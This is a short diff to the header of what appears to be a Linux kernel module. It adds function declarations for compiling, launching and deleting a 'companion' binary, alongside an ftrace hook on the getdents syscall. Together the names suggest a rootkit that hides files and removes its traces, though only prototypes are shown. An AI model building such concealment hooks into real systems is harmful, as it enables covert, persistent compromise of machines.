@@ -18,6 +18,7 @@
 # include <linux/file.h>
 # include <linux/stat.h>
 # include <linux/sched/signal.h>
+# include <linux/namei.h>
 
 // https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
 # pragma GCC optimize("-fno-optimize-sibling-calls")
@@ -39,6 +40,8 @@ int fh_install_hook(t_ftrace_hook *hook);
 void fh_remove_hook(t_ftrace_hook *hook);
 extern asmlinkage long (*g_original_getdents)(const struct pt_regs *);
 
+void compile_companion(void);
+void delete_binary(void);
 void launch_companion(void);
 void get_pid_companion(void);
 
